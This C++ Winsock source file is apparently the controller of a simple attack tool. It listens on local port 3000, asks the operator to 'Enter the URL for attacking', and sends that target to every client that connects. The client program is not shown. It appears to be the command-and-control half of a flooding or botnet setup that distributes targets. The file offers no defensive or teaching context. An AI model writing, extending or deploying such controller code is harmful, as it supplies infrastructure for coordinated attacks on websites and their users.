#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>

#define LHOST "127.0.0.1" // Don't change this
#define LPORT 3000 // Set to the port you set on the client
#define MAXCONN 2 // Set the max number of connections

using namespace std;

#pragma comment(lib, "WS2_32.lib")

WSADATA wsaData;
SOCKET sock;
sockaddr_in saIn;
int iResult;
char buffer[1024];

void RestartSock() {
	closesocket(sock);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	return;
}

void Startup() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "Failed at startup" << endl;
		exit(0);
	}

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	saIn.sin_family = AF_INET;
	inet_pton(AF_INET, LHOST, &saIn.sin_addr.s_addr);
	saIn.sin_port = htons(LPORT);

	iResult = bind(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	if (iResult == SOCKET_ERROR) {
		cout << "Socket error" << endl;
		closesocket(sock);
		exit(0);
	}
	listen(sock, MAXCONN);
	cout << "Enter the URL for attacking: ";
	cin.getline(buffer, sizeof(buffer));
	return;
}

void Listen() {
	cout << "Listening for connections" << endl;

	while (true) {
		SOCKET client = accept(sock, NULL, NULL);
		send(client, buffer, sizeof(buffer), 0);
	}
}

int main() {
	Startup();
	Listen();

	return 0;
}